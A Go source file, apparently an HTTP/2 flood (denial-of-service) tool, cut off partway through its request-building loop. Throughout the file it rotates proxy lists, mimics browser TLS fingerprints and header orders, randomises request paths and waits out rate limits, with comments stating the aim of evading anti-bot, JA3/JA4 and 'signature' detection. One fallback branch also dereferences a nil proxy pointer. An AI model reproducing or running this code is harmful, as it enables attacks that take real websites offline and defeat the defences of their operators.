package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
	tls "github.com/bogdanfinn/utls"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/mem"
)

var (
	statuses = make(map[string]int)
	mu       sync.Mutex

	connections, requests, responses, errors int32
	totalRequests, successCount, errorCount, bytesReceived int64

	target    string
	duration  int
	rps       int
	conns     int
	proxyFile string

	randpath      bool
	randrate      bool
	ratelimitOption bool
	closeOption bool
	proxyAuth bool
	debugmode int
	cookie    string
	useragent string
	proxies   []*ProxyInfo
	proxyIP string
	limit int
	floodOption bool
	useHpack    bool
	verifyProxies    bool
	originRaw        string
	cpuLimit int
)

// HTTP/2 Framer สำหรับ raw frame manipulation
type Framer struct {
	enc *hpack.Encoder
	buf *bytes.Buffer
	id  uint32
}

func (f *Framer) init() {
	f.buf = new(bytes.Buffer)
	f.enc = hpack.NewEncoder(f.buf)
	f.enc.SetMaxDynamicTableSize(65536)
	f.id = 1
}

func (f *Framer) request(headers [][2]string) ([]byte, error) {
	f.buf.Reset()
	for _, header := range headers {
		err := f.enc.WriteField(hpack.HeaderField{Name: header[0], Value: header[1]})
				if err != nil {
			return nil, fmt.Errorf("failed to hpack header")
		}
	}
	payload := new(bytes.Buffer)
	var length [4]byte
	binary.BigEndian.PutUint32(length[:], uint32(len(f.buf.Bytes())))
	payload.Write(length[1:])
	payload.WriteByte(0x01)
	payload.WriteByte(0x05)
	var streamID [4]byte
	binary.BigEndian.PutUint32(streamID[:], f.id)
	payload.Write(streamID[:])
	payload.Write(f.buf.Bytes())
	atomic.AddUint32(&f.id, 2)
	return payload.Bytes(), nil
}

// Proxy structure for connection management with anti-signature #69 attributes
type ProxyInfo struct {
	Addr string
	Auth string
	SessionID string
	// Enhanced anti-signature #69 attributes
	ProfileIndex int     // Browser profile index for this proxy
	LangIndex int        // Accept-Language index for this proxy
	RateFactor float64   // Request rate variation (0.5x - 1.5x)
	ParamKey string      // Cache-busting parameter key
	TimingProfile int    // Timing behavior profile (0-2)
	VolumeProfile int    // Request volume profile (0-2)  
	SessionStartTime time.Time // เพื่อคำนวณ session age
	// Session state management (anti-pattern #3 & anti-signature #69)
	SessionCookies map[string]string // เก็บ cookies สำหรับ session นี้
	LastUserAgent string // เก็บ User-Agent ล่าสุดเพื่อ consistency
	RequestCount int64 // จำนวน request ที่ส่งไปแล้ว
	ErrorCount int64   // จำนวน error ที่เกิดขึ้น
	
	// Advanced anti-botnet detection fields
	BrowserType string           // Browser type for TLS consistency
	PersistentTLSProfile string  // Persistent TLS profile across sessions
	HeaderOrderProfile int       // HTTP/2 header order variation profile
	LastRequestTime time.Time    // Track request intervals
	RequestIntervals []time.Duration // History of request intervals
	DNTEnabled bool              // Do Not Track preference
	PlatformType string          // Windows/Mac/Linux for consistency
	ScreenResolution string      // For realistic viewport headers
	TimeZoneOffset int           // Browser timezone offset
	PluginsHash string           // Simulated browser plugins fingerprint
}

// Generate random string for session IDs
func genRandStr(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	sr := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[sr.Intn(len(charset))]
	}
	return string(b)
}

// ProxyRotationManager manages intelligent proxy rotation to avoid IP reputation issues
type ProxyRotationManager struct {
	proxies         []*ProxyInfo
	mu              sync.RWMutex
	lastRotation    time.Time
	rotationCounter int64
}

// NewProxyRotationManager creates a new proxy rotation manager
func NewProxyRotationManager(proxies []*ProxyInfo) *ProxyRotationManager {
	return &ProxyRotationManager{
		proxies:      proxies,
		lastRotation: time.Now(),
	}
}

// GetHealthyProxy returns a proxy with good reputation and low error rate
func (prm *ProxyRotationManager) GetHealthyProxy() *ProxyInfo {
	prm.mu.RLock()
	defer prm.mu.RUnlock()
	
	// Filter proxies by health metrics
	healthyProxies := make([]*ProxyInfo, 0)
	for _, proxy := range prm.proxies {
		errorRate := float64(proxy.ErrorCount) / float64(proxy.RequestCount + 1)
		
		// Skip proxies with high error rates or too many requests
		if errorRate > 0.2 || proxy.RequestCount > 10000 {
			continue
		}
		
		// Skip proxies that were used very recently (cooling period)
		if time.Since(proxy.LastRequestTime) < 5*time.Second {
			continue
		}
		
		healthyProxies = append(healthyProxies, proxy)
	}
	
	// If no healthy proxies, reset some error counts
	if len(healthyProxies) == 0 {
		for _, proxy := range prm.proxies {
			if proxy.ErrorCount > 100 {
				proxy.ErrorCount = proxy.ErrorCount / 2 // Gradually forgive errors
			}
		}
		healthyProxies = prm.proxies
	}
	
	// Select proxy based on weighted distribution
	if len(healthyProxies) > 0 {
		// Prefer proxies with lower usage
		minRequests := int64(^uint64(0) >> 1)
		var selectedProxy *ProxyInfo
		
		for _, proxy := range healthyProxies {
			if proxy.RequestCount < minRequests {
				minRequests = proxy.RequestCount
				selectedProxy = proxy
			}
		}
		
		return selectedProxy
	}
	
	// Fallback to random proxy
	return prm.proxies[rand.Intn(len(prm.proxies))]
}

// RotateProxies implements intelligent rotation strategies
func (prm *ProxyRotationManager) RotateProxies() {
	prm.mu.Lock()
	defer prm.mu.Unlock()
	
	atomic.AddInt64(&prm.rotationCounter, 1)
	
	// Shuffle proxies occasionally to avoid patterns
	if prm.rotationCounter%100 == 0 {
		rand.Shuffle(len(prm.proxies), func(i, j int) {
			prm.proxies[i], prm.proxies[j] = prm.proxies[j], prm.proxies[i]
		})
	}
	
	prm.lastRotation = time.Now()
}

// UpdateProxyStats updates proxy statistics after request
func (prm *ProxyRotationManager) UpdateProxyStats(proxy *ProxyInfo, success bool, responseTime time.Duration) {
	if proxy == nil {
		return
	}
	
	proxy.LastRequestTime = time.Now()
	proxy.RequestCount++
	
	// Track request intervals for pattern analysis
	if len(proxy.RequestIntervals) >= 10 {
		proxy.RequestIntervals = proxy.RequestIntervals[1:] // Keep last 10
	}
	proxy.RequestIntervals = append(proxy.RequestIntervals, responseTime)
	
	if !success {
		proxy.ErrorCount++
	}
}

// SimulateHumanBehavior adds realistic delays and patterns
func SimulateHumanBehavior(proxy *ProxyInfo) {
	if proxy == nil {
		return
	}
	
	// Calculate average interval from history
	if len(proxy.RequestIntervals) > 0 {
		var totalDuration time.Duration
		for _, interval := range proxy.RequestIntervals {
			totalDuration += interval
		}
		avgInterval := totalDuration / time.Duration(len(proxy.RequestIntervals))
		
		// Add variation based on timing profile
		var delay time.Duration
		switch proxy.TimingProfile {
		case 0: // Conservative - slower, more random
			delay = time.Duration(float64(avgInterval) * (1.5 + rand.Float64()))
		case 1: // Moderate - normal variation
			delay = time.Duration(float64(avgInterval) * (0.8 + rand.Float64()*0.4))
		case 2: // Aggressive - faster, less variation
			delay = time.Duration(float64(avgInterval) * (0.5 + rand.Float64()*0.3))
		}
		
		// Apply minimum delay to avoid being too fast
		if delay < 100*time.Millisecond {
			delay = 100*time.Millisecond
		}
		
		time.Sleep(delay)
	}
}

// Parse proxies with authentication support
func parseProxiesAdvanced(filename string) ([]*ProxyInfo, error) {
	fileData, err := os.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("file not found")
	}
	proxiesList := strings.Split(strings.ReplaceAll(strings.TrimSpace(string(fileData)), "\r\n", "\n"), "\n")
	if len(proxiesList) < 1 {
		return nil, fmt.Errorf("failed to parse proxies")
	}
	
	var result []*ProxyInfo
	num := 0
	var hk string
	
	for _, proxy := range proxiesList {
		if num%25 == 0 {
			// ใช้ header names ที่ดูเป็นธรรมชาติ (เพื่อหลีกเลี่ยง signature #17)
			headerNames := []string{"x-request-id", "x-session-id", "x-trace-id", "x-correlation-id"}
			hk = headerNames[rand.Intn(len(headerNames))]
		}
		p := strings.Split(proxy, ":")
		if len(p) == 2 {
			// สร้าง session ID ที่ดูเป็น UUID หรือ timestamp-based
			sessionValue := fmt.Sprintf("%d-%s", time.Now().UnixMilli(), genRandStr(8))
			result = append(result, &ProxyInfo{
				Addr:      proxy,
				Auth:      "",
				SessionID: fmt.Sprintf("%s:%s", hk, sessionValue),
				// Anti-signature #69: Enhanced proxy characteristics
				ProfileIndex: rand.Intn(6),  // 0-5 browser profiles
				LangIndex: rand.Intn(5),     // 0-4 accept-language options
				RateFactor: 0.5 + rand.Float64(), // 0.5x - 1.5x rate variation
				ParamKey: []string{"v","cb","r","_","cache","t","ts","x"}[rand.Intn(8)],
				TimingProfile: rand.Intn(3), // 0=conservative, 1=moderate, 2=aggressive  
				VolumeProfile: rand.Intn(3), // 0=low, 1=medium, 2=high volume
				SessionStartTime: time.Now(),
				// Initialize session state
				SessionCookies: make(map[string]string),
				RequestCount: 0,
				ErrorCount: 0,
				// Advanced anti-botnet fields
				HeaderOrderProfile: rand.Intn(4), // Different header ordering patterns
				DNTEnabled: rand.Float32() < 0.3, // 30% of browsers have DNT
				PlatformType: []string{"Windows", "Mac", "Linux"}[rand.Intn(3)],
				ScreenResolution: []string{"1920x1080", "1366x768", "1440x900", "2560x1440"}[rand.Intn(4)],
				TimeZoneOffset: []int{-8, -7, -6, -5, -4, -3, 0, 1, 2, 3, 8, 9}[rand.Intn(12)],
				LastRequestTime: time.Now(),
				RequestIntervals: make([]time.Duration, 0, 10),
			})
			num++
		} else if len(p) == 4 {
			sessionValue := fmt.Sprintf("%d-%s", time.Now().UnixMilli(), genRandStr(8))
			result = append(result, &ProxyInfo{
				Addr:      fmt.Sprintf("%s:%s", p[0], p[1]),
				Auth:      base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s:%s", p[2], p[3]))),
				SessionID: fmt.Sprintf("%s:%s", hk, sessionValue),
				// Anti-signature #69: แต่ละ proxy มี characteristics แตกต่างกัน
				ProfileIndex: rand.Intn(6),  // 0-5 browser profiles (Chrome120,Chrome112,Chrome106,Firefox120,Firefox105,Safari)
				LangIndex: rand.Intn(5), 
				RateFactor: 0.5 + rand.Float64(),
				ParamKey: []string{"v","cb","r","_","cache","t","ts","x"}[rand.Intn(8)],
				TimingProfile: rand.Intn(3),
				VolumeProfile: rand.Intn(3),
				SessionStartTime: time.Now(),
				// Initialize session state
				SessionCookies: make(map[string]string),
				RequestCount: 0,
				ErrorCount: 0,
			})
			num++
		}
	}
	return result, nil
}

// Initialize raw TCP connection through proxy
func initConnection(proxy *ProxyInfo, host string, port int) (net.Conn, error) {
	conn, err := net.DialTimeout("tcp", proxy.Addr, time.Duration(5)*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connection to proxy failed")
	}
	
	// Set connection deadline
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	
	req := fmt.Sprintf("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n", host, port, host, port)
	if proxy.Auth != "" {
		req += fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", proxy.Auth)
	}
	req += "\r\n"
	
	_, err = conn.Write([]byte(req))
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to send CONNECT request")
	}
	
	buf := make([]byte, 1460)
	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to read data from socket")
	}
	
	if !strings.Contains(string(buf[:n]), " 200 ") {
		conn.Close()
		return nil, fmt.Errorf("bad http answer code")
	}
	
	// Remove deadline for actual usage
	conn.SetDeadline(time.Time{})
	return conn, nil
}

// Establish custom TLS connection with advanced anti-signature #69 fingerprinting
func establishTls(hostname string, conn *net.Conn, proxyInfo *ProxyInfo) (tls.UConn, error) {
	conf := &tls.Config{
		ServerName: hostname,
		InsecureSkipVerify: true,
		// Advanced TLS configuration to mimic real browsers
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
	}
	
	// Enhanced TLS fingerprint selection with more realistic browser distribution
	var clientHello tls.ClientHelloID
	
	if proxyInfo != nil {
		// Create weighted distribution based on real browser market share
		fingerprints := []struct {
			id     tls.ClientHelloID
			weight float32
			browser string
		}{
			{tls.HelloChrome_120, 0.35, "Chrome"}, // Chrome 120 - newest
			{tls.HelloChrome_112, 0.25, "Chrome"}, // Chrome 112 - common
			{tls.HelloChrome_106, 0.15, "Chrome"}, // Chrome 106 - older but still used
			{tls.HelloFirefox_120, 0.10, "Firefox"}, // Firefox latest
			{tls.HelloFirefox_105, 0.08, "Firefox"}, // Firefox older
			{tls.HelloSafari_16_0, 0.07, "Safari"},  // Safari macOS
		}
		
		// Use weighted random selection based on proxy profile
		randVal := rand.Float32()
		cumWeight := float32(0)
		
		for _, fp := range fingerprints {
			cumWeight += fp.weight
			if randVal <= cumWeight {
				clientHello = fp.id
				proxyInfo.BrowserType = fp.browser
				break
			}
		}
		
		// Session persistence - maintain browser identity per proxy session
		if proxyInfo.PersistentTLSProfile != "" {
			// Restore previous TLS profile if exists
			for _, fp := range fingerprints {
				if fp.browser == proxyInfo.PersistentTLSProfile {
					clientHello = fp.id
					break
				}
			}
		} else {
			// Save the selected profile for consistency
			proxyInfo.PersistentTLSProfile = proxyInfo.BrowserType
		}
		
		// Simulate browser updates realistically (anti-JA3/JA4 pattern detection)
		sessionDays := int(time.Since(proxyInfo.SessionStartTime).Hours() / 24)
		if sessionDays > 7 && rand.Float32() < 0.02 { // 2% chance per week
			// Browser update simulation - move to newer version
			if clientHello == tls.HelloChrome_106 {
				clientHello = tls.HelloChrome_112
			} else if clientHello == tls.HelloChrome_112 {
				clientHello = tls.HelloChrome_120
			} else if clientHello == tls.HelloFirefox_105 {
				clientHello = tls.HelloFirefox_120
			}
		}
	} else {
		// No proxy info - use market share distribution
		distribution := []tls.ClientHelloID{
			tls.HelloChrome_120, tls.HelloChrome_120, tls.HelloChrome_120, // 30%
			tls.HelloChrome_112, tls.HelloChrome_112, // 20%
			tls.HelloChrome_106, // 10%
			tls.HelloFirefox_120, // 10%
			tls.HelloFirefox_105, // 10%
			tls.HelloSafari_16_0, // 10%
			tls.HelloChrome_120, // Extra 10% for Chrome dominance
		}
		clientHello = distribution[rand.Intn(len(distribution))]
	}
	
	// Create connection with proper SNI and ALPN protocols
	wConn := tls.UClient(*conn, conf, clientHello, true, true) // Enable SNI and session tickets
	
	// Custom handshake with retry logic
	err := wConn.Handshake()
	if err != nil {
		// Log specific TLS errors for debugging
		if debugmode > 2 {
			fmt.Printf("[TLS] Handshake failed with %v, fingerprint: %v\n", err, clientHello)
		}
		return tls.UConn{}, fmt.Errorf("TLS handshake failed: %w", err)
	}
	
	return *wConn, nil
}

func Ratelimit(parsed *url.URL, proxy *ProxyInfo, timeout int) {
	timeout++
	ratelimit_timeout := timeout
	proxyAddr := ""
	if proxy != nil {
		proxyAddr = proxy.Addr
	}
	for {
		if timeout <= 0 {
			if debugmode > 1 {
				fmt.Printf("[H2C] | (%s) ratelimit bypassed [%d/%d]\n", proxyAddr, timeout, ratelimit_timeout)
			}
			startRawTLS(parsed, proxy)
			return
		}
		if debugmode > 1 {
			fmt.Printf("[H2C] | (%s) ratelimit [%d/%d]\n", proxyAddr, timeout, ratelimit_timeout)
		}
		time.Sleep(1 * time.Second)
		timeout--
	}
}



func FormatProxyURL(raw string) string {
	if raw == "" {
		return raw
	}
	if strings.HasPrefix(raw, "http://") || strings.HasPrefix(raw, "https://") {
		return raw
	}
	if proxyAuth {
		if strings.Contains(raw, "@") {
			return "http://" + raw
		}
		if strings.Count(raw, ":") == 3 {
			parts := strings.Split(raw, ":")
			return fmt.Sprintf("http://%s:%s@%s:%s", parts[0], parts[1], parts[2], parts[3])
		}
	}
	return "http://" + raw
}

func startRawTLS(parsed *url.URL, proxyInfo *ProxyInfo) {
	atomic.AddInt32(&connections, 1)
	defer atomic.AddInt32(&connections, -1)

	scheme := "https"
	if parsed.Scheme == "http" {
		scheme = "http"
	}
	
	// Anti-correlation delay: หลีกเลี่ยงการเชื่อมโยงกันของคำขอจาก proxy ต่างๆ (anti-signature #69)
	if proxyInfo != nil {
		// ใช้ hash ของ proxy address เป็น seed เพื่อสร้าง deterministic แต่ diverse delay
		proxyHash := 0
		for _, b := range []byte(proxyInfo.Addr) {
			proxyHash = proxyHash*31 + int(b)
		}
		correlationDelay := time.Duration((proxyHash%2000)+500) * time.Millisecond
		time.Sleep(correlationDelay)
	}
	
	// Extract hostname and port
	hostname := parsed.Hostname()
	port := 443
	if parsed.Scheme == "http" {
		port = 80
	}
	if parsed.Port() != "" {
		if p, err := strconv.Atoi(parsed.Port()); err == nil {
			port = p
		}
	}
	
		// Enhanced browser profiles ที่สอดคล้องกับ TLS fingerprints (anti-pattern #3)
		browserProfiles := []struct {
			userAgent       string
			secChUA         string
			secChUAPlatform string
			isFirefox       bool
			isSafari        bool
			isEdge          bool
			acceptEncoding  string
			acceptValue     string
		}{
			// Chrome 120 profiles  
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
				"\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
				"\"Windows\"", false, false, false,
				"gzip, deflate, br, zstd", 
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			},
			// Chrome 112 profiles (เปลี่ยนจาก 119)
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
				"\"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
				"\"Windows\"", false, false, false,
				"gzip, deflate, br, zstd",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			},
			// Chrome 106 profile (เปลี่ยนจาก 118)
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
				"\"Chromium\";v=\"106\", \"Google Chrome\";v=\"106\", \"Not;A=Brand\";v=\"99\"",
				"\"Windows\"", false, false, false,
				"gzip, deflate, br",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			},
			// Firefox 120 profiles
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
				"", "", true, false, false,
				"gzip, deflate, br",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
			},
			// Firefox 105 profile (เปลี่ยนจาก 119)
			{
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", 
				"", "", true, false, false,
				"gzip, deflate, br",
				"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
			},
			// Safari 16.0 profile (macOS)
			{
				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
				"", "\"macOS\"", false, true, false,
				"gzip, deflate, br",
				"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			},
		}
	
	acceptLanguages := []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9", 
		"ru,en;q=0.9,en-US;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
	}
	
	// Advanced session management กับ organic behavior simulation (anti-signature #69)
	sessionAge := 0
	maxSessionAge := RandomInt(50, 200)
	
	// Dynamic session characteristics ที่เปลี่ยนแปลงตามเวลา
	var sessionRequests int64 = 0
	var sessionErrors int64 = 0
	
	// Organic traffic patterns - จำลองพฤติกรรมมนุษย์จริง
	dailyPatterns := []struct {
		hour int
		activityMultiplier float64
		pauseProbability float32
	}{
		{0, 0.1, 0.9},   // กลางคืน - activity น้อย, pause เยอะ
		{1, 0.05, 0.95},
		{2, 0.03, 0.97},
		{6, 0.3, 0.7},   // เช้า - เริ่มมี activity
		{8, 0.8, 0.3},   // เช้าทำงาน - activity สูง
		{12, 1.0, 0.2},  // เที่ยง - peak activity
		{14, 0.9, 0.3},  // บ่าย - activity สูง
		{18, 0.7, 0.4},  // เย็น - ลดลง
		{22, 0.4, 0.6},  // ค่ำ - activity ปานกลาง
	}
	
	currentHour := time.Now().Hour()
	var currentPattern struct {
		hour int
		activityMultiplier float64
		pauseProbability float32
	}
	
	// หา pattern ที่ใกล้เคียงกับเวลาปัจจุบัน
	for _, pattern := range dailyPatterns {
		if currentHour >= pattern.hour {
			currentPattern = pattern
		}
	}
	
	for {
		sessionAge++
		
		// Enhanced header generation with anti-signature #69 features
		var browserProfile struct {
			userAgent       string
			secChUA         string
			secChUAPlatform string
			isFirefox       bool
			isSafari        bool
			isEdge          bool
			acceptEncoding  string
			acceptValue     string
		}
		var acceptLang string
		
		// Use advanced fingerprinting if proxy info available
		if proxyInfo != nil {
			// Generate realistic User-Agent based on proxy characteristics
			if proxyInfo.LastUserAgent == "" || proxyInfo.RequestCount == 0 {
				// First request - establish browser identity
				proxyInfo.LastUserAgent = GenerateRealisticUserAgent(proxyInfo.BrowserType, proxyInfo.PlatformType)
			}
			
			// Find matching browser profile or create custom one
			profileFound := false
			for _, profile := range browserProfiles {
				if strings.Contains(profile.userAgent, proxyInfo.BrowserType) &&
				   strings.Contains(profile.userAgent, proxyInfo.PlatformType) {
					browserProfile = profile
					browserProfile.userAgent = proxyInfo.LastUserAgent
					profileFound = true
					break
				}
			}
			
			if !profileFound {
				// Create custom profile based on proxy attributes
				browserProfile.userAgent = proxyInfo.LastUserAgent
				browserProfile.isFirefox = strings.Contains(proxyInfo.BrowserType, "Firefox")
				browserProfile.isSafari = strings.Contains(proxyInfo.BrowserType, "Safari")
				browserProfile.isEdge = strings.Contains(proxyInfo.BrowserType, "Edge")
				
				// Set appropriate values based on browser type
				if browserProfile.isFirefox {
					browserProfile.acceptEncoding = "gzip, deflate, br"
					browserProfile.acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
				} else if browserProfile.isSafari {
					browserProfile.acceptEncoding = "gzip, deflate, br"
					browserProfile.acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
					browserProfile.secChUAPlatform = "\"macOS\""
				} else { // Chrome/Edge
					browserProfile.acceptEncoding = "gzip, deflate, br, zstd"
					browserProfile.acceptValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
					browserProfile.secChUA = GenerateSecChUa(proxyInfo.BrowserType, proxyInfo.LastUserAgent)
					browserProfile.secChUAPlatform = fmt.Sprintf("\"%s\"", proxyInfo.PlatformType)
				}
			}
			
			// Generate realistic Accept-Language
			langIdx := proxyInfo.LangIndex % len(acceptLanguages)
			primaryLang := acceptLanguages[langIdx]
			acceptLang = GenerateAcceptLanguage(strings.Split(primaryLang, ",")[0])
		} else {
			// Fallback to random selection
			browserProfile = browserProfiles[rand.Intn(len(browserProfiles))]
			acceptLang = acceptLanguages[rand.Intn(len(acceptLanguages))]
			
			// Session consistency - ใช้ User-Agent เดิมถ้าเคยใช้แล้ว (anti-pattern #3)
			if proxyInfo.LastUserAgent != "" && proxyInfo.RequestCount > 0 {
				// บางครั้งอาจมี minor updates (เหมือน browser auto-update)
				if proxyInfo.RequestCount%100 == 0 && rand.Float32() < 0.02 {
					// 2% chance every 100 requests ของ "browser update"
					sessionMinutes := int(time.Since(proxyInfo.SessionStartTime).Minutes())
					if sessionMinutes > 60 { // อย่างน้อย 1 ชม. แล้วถึงจะ update
						proxyInfo.LastUserAgent = browserProfile.userAgent
					}
				}
				// ใช้ User-Agent เดิมเพื่อ consistency
				for i := range browserProfiles {
					if browserProfiles[i].userAgent == proxyInfo.LastUserAgent {
						browserProfile = browserProfiles[i]
						break
					}
				}
			} else {
				// First request - บันทึก User-Agent ไว้
				proxyInfo.LastUserAgent = browserProfile.userAgent
			}
		}
		
		// Realistic sec-fetch headers rotation (เพื่อหลีกเลี่ยง signature #17)
		var secFetchSite, secFetchMode, secFetchUser, secFetchDest string
		
		// จำลองพฤติกรรมเบราว์เซอร์จริง: หน้าแรก vs subsequent requests
		if rand.Float32() < 0.2 { // 20% เป็น first request
			secFetchSite = "none"
			secFetchMode = "navigate"
			secFetchUser = "?1"
			secFetchDest = "document"
		} else { // 80% เป็น subsequent requests
			sites := []string{"same-site", "same-origin", "cross-site"}
			secFetchSite = sites[rand.Intn(len(sites))]
			modes := []string{"navigate", "cors", "no-cors"}
			secFetchMode = modes[rand.Intn(len(modes))]
			if secFetchMode == "navigate" {
				secFetchUser = "?1"
			} else {
				secFetchUser = "?0"
			}
			destinations := []string{"document", "empty", "iframe"}
			secFetchDest = destinations[rand.Intn(len(destinations))]
		}
		
		// Dynamic path with randomization
		path := parsed.Path
		if path == "" {
			path = "/"
		}
		// Query parameter ที่ดูเป็นธรรมชาติมากขึ้น (เพื่อหลีกเลี่ยง signature #17)
		if strings.Contains(path, "%RAND%") {
		path = strings.Replace(path, "%RAND%", RandomString(6), -1)
		}
		if randpath {
			// ใช้ timestamp และ random สำหรับ cache-busting ที่ดูธรรมชาติ (anti-signature #69)
			timestamp := time.Now().UnixMilli()
			// ใช้ proxy-specific ParamKey เพื่อหลีกเลี่ยง pattern detection
			paramKey := "v"
			if proxyInfo != nil && proxyInfo.ParamKey != "" {
				paramKey = proxyInfo.ParamKey
			}
			cacheBuster := fmt.Sprintf("%s=%d-%s", paramKey, timestamp, RandomString(4))
			if strings.Contains(path, "?") {
				path += "&" + cacheBuster
			} else {
				path += "?" + cacheBuster
			}
		}
		
		// Enhanced header building with realistic ordering based on browser type
		var h2_headers [][2]string
		
		// Pseudo headers always come first in HTTP/2
		h2_headers = append(h2_headers, [2]string{":method", "GET"})
		h2_headers = append(h2_headers, [2]string{":authority", parsed.Host})
		h2_headers = append(h2_headers, [2]string{":scheme", scheme})
		h2_headers = append(h2_headers, [2]string{":path", path})
		
		// Browser-specific header ordering (anti-signature #69)
		if proxyInfo != nil && proxyInfo.HeaderOrderProfile >= 0 {
			switch proxyInfo.HeaderOrderProfile % 4 {
			case 0: // Chrome standard order
				if !browserProfile.isFirefox && !browserProfile.isSafari {
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
				}
				h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
				if !browserProfile.isFirefox && !browserProfile.isSafari {
					h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
					h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
					h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
					h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
				}
				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
				
			case 1: // Firefox order
				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
				if !browserProfile.isFirefox {
					h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
				}
				
			case 2: // Safari order
				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
				if scheme == "http" || !browserProfile.isSafari {
					h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
				}
				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
				
			case 3: // Alternative Chrome order (some versions)
				h2_headers = append(h2_headers, [2]string{"user-agent", browserProfile.userAgent})
				if !browserProfile.isFirefox && !browserProfile.isSafari {
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
					h2_headers = append(h2_headers, [2]string{"sec-ch-ua-platform", browserProfile.secChUAPlatform})
				}
				h2_headers = append(h2_headers, [2]string{"accept", browserProfile.acceptValue})
				h2_headers = append(h2_headers, [2]string{"upgrade-insecure-requests", "1"})
				if !browserProfile.isFirefox && !browserProfile.isSafari {
					h2_headers = append(h2_headers, [2]string{"sec-fetch-site", secFetchSite})
					h2_headers = append(h2_headers, [2]string{"sec-fetch-mode", secFetchMode})
					h2_headers = append(h2_headers, [2]string{"sec-fetch-user", secFetchUser})
					h2_headers = append(h2_headers, [2]string{"sec-fetch-dest", secFetchDest})
				}
				h2_headers = append(h2_headers, [2]string{"accept-encoding", browserProfile.acceptEncoding})
				h2_headers = append(h2_headers, [2]string{"accept-language", acceptLang})
			}
		} else {
			// Fallback to standard order
			if !browserProfile.isFirefox {
				h2_headers = append(h2_headers, [2]string{"sec-ch-ua", browserProfile.secChUA})
				h2_headers = append(h2_headers, [2]string{"sec-ch-ua-mobile", "?0"})
